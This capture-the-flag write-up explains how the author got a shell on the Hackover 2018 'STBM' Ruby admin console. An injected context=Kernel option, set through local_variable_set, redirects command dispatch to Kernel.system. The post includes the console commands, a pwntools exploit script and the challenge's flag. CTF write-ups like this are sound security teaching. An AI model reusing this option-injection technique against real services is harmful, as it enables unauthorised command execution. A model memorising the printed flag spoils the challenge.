> Job description: Kryssen-Trupp sadly lost their admin password for the STBM.
> A team of 'ruby-firmware specialists' is needed for the extraction of the
> 'password' (flag.txt). Shell access is granted for the interview.

We get *shell* access to *ze Schnelle Tunnelbohrmaschine Mark III Admin
Interfetz*. Here's what we get upon connection:

```  
$ nc stbm.ctf.hackover.de 1337  
.----------------.  .----------------.  .----------------.  .----------------.  
| .--------------. || .--------------. || .--------------. || .--------------. |  
| |    _______   | || |  _________   | || |   ______     | || | ____    ____ | |  
| |   /  ___  |  | || | |  _   _  |  | || |  |_   _ \    | || ||_   \  /   _|| |  
| |  |  (__ \_|  | || | |_/ | | \_|  | || |    | |_) |   | || |  |   \/   |  | |  
| |   '.___`-.   | || |     | |      | || |    |  __'.   | || |  | |\  /| |  | |  
| |  |`\____) |  | || |    _| |_     | || |   _| |__) |  | || | _| |_\/_| |_ | |  
| |  |_______.'  | || |   |_____|    | || |  |_______/   | || ||_____||_____|| |  
| |              | || |              | || |              | || |              | |  
| '--------------' || '--------------' || '--------------' || '--------------' |  
'----------------'  '----------------'  '----------------'  '----------------'

Welcome to ze Schnelle Tunnelbohrmaschine Mark III Admin Interfetz.

© Copyright by Kryssen-Trupp 2018

Type help or see handbook for more information.

>  
```

Okay, so let's check out what we can actually do here:

```  
> help

Available commands: available_modules, help, quit, switch_module, system,
version

> available_modules

Available modules: DrillCommands, FirmwareCommands, MovementCommands,
SystemCommands

>  
```

We can see that we can execute different commands from different modules.  
Hmmmmm... *FirmwareCommands* sounds pretty cool! Let's switch to that one and
have a closer look:

```  
> switch_module FirmwareCommands

> help

Available commands: available_modules, dump, help, quit, switch_module, update

>   
```

Huh! Well, if we can dump the firmware, let's do it!

```  
> dump  
#!/usr/bin/env ruby  
puts(<<-'MOTD')  
.----------------.  .----------------.  .----------------.  .----------------.  
| .--------------. || .--------------. || .--------------. || .--------------. |  
| |    _______   | || |  _________   | || |   ______     | || | ____    ____ | |  
| |   /  ___  |  | || | |  _   _  |  | || |  |_   _ \    | || ||_   \  /   _|| |  
| |  |  (__ \_|  | || | |_/ | | \_|  | || |    | |_) |   | || |  |   \/   |  | |  
| |   '.___`-.   | || |     | |      | || |    |  __'.   | || |  | |\  /| |  | |  
| |  |`\____) |  | || |    _| |_     | || |   _| |__) |  | || | _| |_\/_| |_ | |  
| |  |_______.'  | || |   |_____|    | || |  |_______/   | || ||_____||_____|| |  
| |              | || |              | || |              | || |              | |  
| '--------------' || '--------------' || '--------------' || '--------------' |  
'----------------'  '----------------'  '----------------'  '----------------'

Welcome to ze Schnelle Tunnelbohrmaschine Mark III Admin Interfetz.

© Copyright by Kryssen-Trupp 2018

Type help or see handbook for more information.  
MOTD

# use digest and base64 for MD5 checksum compare on firmware update  
require "digest"  
require "base64"  
(...)  
```

Yeah, that's the stuff! So, we get a full *firmware* dump of the interface -
you can get it here:
[firmware.rb](https://d0vine.github.io/files/ctf_0x03/firmware.rb). First
thing that caught our eye was the firmware update functionality:

```ruby  
def update(new_firmware, options)  
 update_password = File.read("flag.txt")

 decoded_firmware = Base64.decode64(new_firmware)  
 firmware_checksum = Digest::MD5.hexdigest(decoded_firmware)

 firmware_valid = firmware_checksum == options.local_variable_get(:checksum)  
 password_correct = (  
   Digest::MD5.hexdigest(update_password) ==  
   Digest::MD5.hexdigest("HO18CTF-#{options.local_variable_get(:password)}")  
 )  
 sleep(rand + 1.0)

 if firmware_valid && password_correct  
   File.open("#{__FILE__}.new", "w") do |file|  
     file.puts new_firmware  
   end  
   log "Firmware Update! Please issue reboot command via SystemCommands
module."  
 else  
   log "Checksum Invalid or Password incorrect! Can't update Firmware."  
 end  
end  
```

So, the firmware is updated after checking the checksum and update password
hash (with a *salt*), that is loaded from the `flag.txt` file.  
Let's try the update:

```  
> update test checksum=555 password=lol  
Checksum Invalid or Password incorrect! Can't update Firmware.

>  
```

We've thought for a while how to bypass this, but decided that would be
useless anyway, as the process would be restarted (the `reboot` command).

Ultimately what caught our eye yet again was:

```ruby  
def update(new_firmware, options)  
 update_password = File.read("flag.txt")  
```

What is important here is that the `update` method gets the `option` parameter
- it contains all the options of the command.

What happens to those options?

```ruby  
if
(/(?<command_name>[^\s]+)\s*(?<parameter>[^\s]+)?\s*((?<option_name>[^\s]+)=(?<option_value>[^\s]+))?/i
=~ input) && command =
Kernel.const_get(context).singleton_method(command_name)  
 case  
 when parameter && option_name  
   raise ArgumentError, "command doesn't take options" if
command.parameters.count < 2  
   options = binding

   input.scan(/((?<option_name>[^\s]+)=(?<option_value>[^\s]+))/i) do
|(option, value)|  
     options.local_variable_set(option, value)  
   end

   command.call(parameter, options)  
 when parameter  
   command.call(parameter)  
 else  
   command.call  
 end  
else  
 raise NameError, "<none>"  
end  
```

This line:

```ruby  
options.local_variable_set(option, value)  
```

is what is the problem! Why? Hm... how do you think the current module is set?
You guessed it - via the *local_variable_set* function!

We can see the relevant part here:

```ruby  
def switch_module(module_name)  
 if VALID_MODULES.include?(module_name)  
   ROOT_MODULE.local_variable_set :context, module_name  
 else  
   log "Invalid Module: #{module_name}"

   CommonCommands.available_modules  
 end  
end  
```

Once the module is switched, the function we want to call is fetched via
`get_singleton_method`:

```ruby  
command = Kernel.const_get(context).singleton_method(command_name)  
```

and called with our arguments:

```ruby  
# (...)  
 command.call(parameter, options)  
when parameter  
 command.call(parameter)  
else  
 command.call  
end  
```

So, let's write down what we know:  
- we have the `update` function that gets arguments  
- once arguments are parsed, each argument is set via `local_variable_set`  
- we can pass any arguments we want  
- the `context` set with `local_variable_set` is what determines where the function is called from  
- we control what function is executed

Hence: we can call any function we want from any module we imagine.

Let's check this with the `update` command and `Kernel.system`:

```  
> switch_module FirmwareCommands

> update test context=Kernel checksum=555 password=lol  
Checksum Invalid or Password incorrect! Can't update Firmware.

> system id  
uid=1000(ctf) gid=1000(ctf)

>  
```

Yeah! So let's read the flag:

```  
> system ls  
cant_bus.rb  flag.txt     stbm

> system cat flag.txt  
(hang)  
```

Wait, what? Well... we've done goofed! In this case we get to that line:

```  
command.call(parameter)  
```

which gets one parameter - hence it waits for input instead of reading the
file.

We can quickly verify this:

```  
> system ls  
cant_bus.rb  flag.txt     stbm

> system ls ../  
cant_bus.rb  flag.txt     stbm  
```

But that's not exactly an issue, since we can drop `/bin/sh` and do anything
we want from there:

```  
> system '/bin/sh'  
~ $ ^[[46;5Rls  
ls  
cant_bus.rb  flag.txt     stbm  
~ $ ^[[46;5Rcat flag.txt  
cat flag.txt  
hackover18{54fda39cd95ed88a5446953dbdf36a5d}  
~ $ ^[[46;5R  
```

BTW, I have automated this a bit using Python and the great `pwntools`
library:

```python  
from pwn import *

r = remote('stbm.ctf.hackover.de', 1337)

r.send("switch_module FirmwareCommands\n")  
r.send("update test context=Kernel checksum=555 password=lol\n")  
r.send("system /bin/sh\n")  
# ^-- since I'm lazy, just wait for "Checksum Invalid (...)"  
#     before proceeding :-P  
r.interactive()  
```

**Flag:** `hackover18{54fda39cd95ed88a5446953dbdf36a5d}`

That was a pretty neat task, especially given I have no knowledge of Ruby
whatsoever; I relied solely on the docs ;-)